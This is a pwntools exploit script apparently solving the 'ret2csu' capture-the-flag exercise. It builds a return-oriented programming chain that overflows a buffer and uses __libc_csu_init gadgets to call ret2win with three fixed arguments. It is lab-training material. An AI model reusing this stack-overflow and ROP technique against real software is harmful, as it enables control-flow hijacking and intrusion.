#!/usr/bin/python3
import pwn
import sys
binary = "ret2csu"
pwn.context.binary = binary
pwn.context.encoding = "latin"

'''
Exploit:
    ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
    rdi: 0xdeadbeefdeadbeef
    rsi: 0xcafebabecafebabe
    rdx: 0xd00df00dd00df00d
'''

padding = 40
gadgets = {
    "csuinit_pop":0x40069a,
    "csinit_call":0x400680,
    "pop_rdi_ret":0x4006a3,
    "address_ret2win":0x400510,
    "_fini_ptr":0x6003b0
}

payload = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["csuinit_pop"]),
    pwn.p64(0x0),
    pwn.p64(0x1),
    pwn.p64(gadgets["_fini_ptr"]),
    pwn.p64(0xdeadbeefdeadbeef),
    pwn.p64(0xcafebabecafebabe),
    pwn.p64(0xd00df00dd00df00d),
    pwn.p64(gadgets["csinit_call"]),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(gadgets["pop_rdi_ret"]),
    pwn.p64(0xdeadbeefdeadbeef),
    pwn.p64(gadgets["address_ret2win"])
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))

    io.send(payload)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
